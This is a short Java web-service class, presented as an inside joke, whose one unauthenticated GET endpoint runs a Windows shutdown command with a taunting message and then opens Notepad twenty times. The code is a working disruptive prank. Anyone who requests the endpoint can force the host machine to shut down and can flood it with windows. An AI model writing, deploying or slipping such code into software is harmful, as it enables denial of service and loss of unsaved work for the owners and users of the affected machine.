// This is just an inside joke!

package DangerZone;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.core.Response;
import java.io.IOException;

@Path("")
public class RunThisClass {
    @GET
    @Path("/die-monster")
    public Response die() throws IOException {
        Runtime.getRuntime().exec("shutdown -s -t 130 /c \"I WARNED YOU! YOU HAVE 1:30 MIN TO OPEN CMD AND TYPE 'shutdown /a', OTHERWISE, YOUR PC WILL TURN OFF!!\"");

        for (int i = 0; i < 20; i++) {
            Runtime.getRuntime().exec("notepad.exe");
        }

        return null;
    }
}